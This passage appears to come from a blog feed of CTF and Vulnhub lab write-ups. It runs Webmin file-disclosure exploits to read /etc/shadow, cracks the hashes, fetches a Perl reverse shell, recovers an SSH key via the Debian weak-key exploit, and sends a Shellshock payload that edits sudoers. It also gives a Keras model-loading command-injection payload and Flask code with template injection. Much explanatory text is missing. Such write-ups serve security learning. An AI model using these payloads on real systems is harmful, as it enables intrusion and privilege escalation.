class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash</span><br><span class="line">obama:x:1001:1001::/home/obama:/bin/bash</span><br><span class="line">osama:x:1002:1002::/home/osama:/bin/bash</span><br><span class="line">yomama:x:1003:1003::/home/yomama:/bin/bash</span><br></pre></td></tr></table></figure><p><code>http://192.168.32.128/php/phpMyAdmin/</code><br /><code>phpMyAdmin 2.6.3-pl1</code></p><p><strong>10000</strong><code>webmin</code></p><p><code>searchsploit webmin</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/2017.pl</span><br></pre></td></tr></table></figure><p><strong></strong><code>shadow</code><br /><code>searchsploit webmin -m 2017.pl</code><br /><code>perl 2017.pl -h</code><br /><code>perl 2017.pl 192.168.32.128 10000 /etc/shadow 0</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::</span><br><span class="line">obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::</span><br><span class="line">osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::</span><br><span class="line">yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span><br></pre></td></tr></table></figure><p><code>hash</code><br /><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>vmware/h4ckm3</code></p><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><h2 id="-4"><a class="markdownIt-Anchor" href="#-4"></a> </h2><p><code>sudo</code></p><p><code>shadow</code><strong>root</strong><code>shell</code><strong>root</strong></p><p><code>cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi</code><code>vim</code><code>ip</code></p><p><code>kali</code><code>web</code><code>php -S 0:80</code><br /><code>wget http://192.168.32.129/shell.cgi</code><strong></strong><code>chmod +x shell.cgi</code></p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/shell.cgi 0</code><br /><code>kali</code></p><p><code>cgi</code><code>apache</code><strong></strong><code>cgi</code><code>php</code><code>pl</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><strong></strong><code>shadow</code><strong></strong></p><h3 id="sshauthorized_keys"><a class="markdownIt-Anchor" href="#sshauthorized_keys"></a> sshAuthorized_keys</h3><p><code>OpenSSL 0.9.8e</code><code>OpenSSL</code><strong></strong><strong></strong></p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/.ssh/authorized_keys 0</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw== vmware@ubuntuvm</span><br></pre></td></tr></table></figure><p><code>OpenSSH</code><code>PRG</code>(pseudo random number generator)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit prng </span><br><span class="line">searchsploit prng -m 5622.txt</span><br><span class="line">cat 5622.txt</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2</span><br><span class="line">tar -jxvf 5622.tar.bz2</span><br><span class="line">grep -lr &#x27;AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQ&#x27;</span><br><span class="line">cp rsa/2048/d8629ce6dc8f2492e1454c13f46adb26-4566 private_key</span><br></pre></td></tr></table></figure><p><code>ssh -i private_key -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><p><code>windows</code><code>kali</code><code>command-line line 0: Bad key types 'ssh-rsa,ssh-dss'.</code></p><p></p><h3 id="shellshock"><a class="markdownIt-Anchor" href="#shellshock"></a> shellshock</h3><p><code>bash --version</code><code>GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)</code>4.3<strong>shellshock</strong></p><p><code>vim shellshockexp.cgi</code><code>#!/bin/bash</code></p><p><code>curl 'http://192.168.32.128:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/shellshockexp.cgi' -A '() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers'</code></p><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Error - Missing Content-Type Header&lt;/h1&gt;</span><br><span class="line">&lt;pre&gt;Failed to exec /usr/local/webmin/mscstyle3/unauthenticated/../../../../../../../../../../../../../../home/vmware/shellshockexp.cgi : Permission denied</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><code>sudo /bin/bash</code></p><p><strong>Linux</strong><strong></strong><code>exp</code><br /><code>Linux ubuntuvm 2.6.22-14-server</code></p><h2 id="-9"><a class="markdownIt-Anchor" href="#-9"></a> </h2><p></p><h1 id="holynix"><a class="markdownIt-Anchor" href="#holynix"></a> holynix()</h1><h2 id="-8"><a class="markdownIt-Anchor" href="#-8"></a> </h2><p><code>nmap -sn 192.168.32.0/24</code><br /><code>192.168.32.130</code><br /><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br />80<br />SQL</p><h2 id="web-10"><a class="markdownIt-Anchor" href="#web-10"></a> web</h2><p>cms<br /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL Error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span><br><span class="line">SQL Statement:SELECT * FROM accounts WHERE username=&#x27;\&#x27;&#x27; AND password=&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p></p><p><code>xx/' or 1=1#</code></p><p><code>Home directory uploading disabled for user alamo</code><br /><code>Security</code>getpost<br /><code>http://192.168.32.130/index.php?page=ssp.php</code><br /><code>B=Display+File&amp;text_file_name=ssp%2Femail.txt</code><br /><code>text_file_name</code></p><p>()</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vulnhub&lt;/code&gt;()&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web</title>
    <link href="https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-05-31T18:44:13.000Z</published>
    <updated>2025-05-31T18:58:02.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="d3ctf2025-d3model"><a class="markdownIt-Anchor" href="#d3ctf2025-d3model"></a> D3CTF2025 - d3model</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><code>is_valid_model()</code><code>keras.models.load_model()</code><code>CVE-2025-1550</code><a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models"></a></p><p><br /><strong>pythonsubprocess</strong>emmm</p><p><code>&quot;inbound_nodes&quot;: [&#123;&quot;args&quot;: [[&quot;env &gt;&gt; index.html&quot;]], &quot;kwargs&quot;: &#123;&quot;bufsize&quot;: -1, &quot;shell&quot;: True&#125;&#125;]</code><br /><code>json</code><strong>shell</strong></p><blockquote><p>shellTrueshellshell</p></blockquote><p><strong></strong><code>docker</code><code>flag</code><strong></strong><code>index.html</code></p><p></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;d3ctf2025-d3model&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#d3ctf2025-d3model&quot;&gt;&lt;/a&gt; D3CTF2025 - d3model&lt;/h1&gt;
&lt;figure class=&quot;highlight py&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ACTF2025</title>
    <link href="https://hvang10.github.io/2025/04/26/ACTF2025/"/>
    <id>https://hvang10.github.io/2025/04/26/ACTF2025/</id>
    <published>2025-04-26T09:21:20.000Z</published>
    <updated>2025-05-02T17:44:43.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> signin</h2><blockquote><p><a href="https://github.com/team-s2/ACTF-2025">https://github.com/team-s2/ACTF-2025</a></p></blockquote><p><img src="https://picx.zhimg.com/80/v2-be1c2454925cc232fe32bdc9dce6ec1a_1440w.png" alt="" /><br /><strong>ACTF{w3lc0ME2aCtf2O25h@veAn1ceDAY}</strong></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="not-so-web-1"><a class="markdownIt-Anchor" href="#not-so-web-1"></a> not so web 1</h2><blockquote><p>Web</p></blockquote><p><code>web</code><strong>AES-CBC</strong></p><p><code>server code (encoded)</code><code>base64</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass(<span class="params">kw_only=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        cookie_json = cipher.decrypt(padded)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        decrypted = cipher.decrypt(padded)</span><br><span class="line">        cookie_json_bytes = unpad(decrypted, <span class="number">16</span>)</span><br><span class="line">        cookie_json = cookie_json_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_dict = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, cookie_dict.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_dict = asdict(user)</span><br><span class="line">    cookie_json = json.dumps(cookie_dict)</span><br><span class="line">    cookie_json_bytes = cookie_json.encode()</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    padded = pad(cookie_json_bytes, <span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(</span><br><span class="line">                    time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    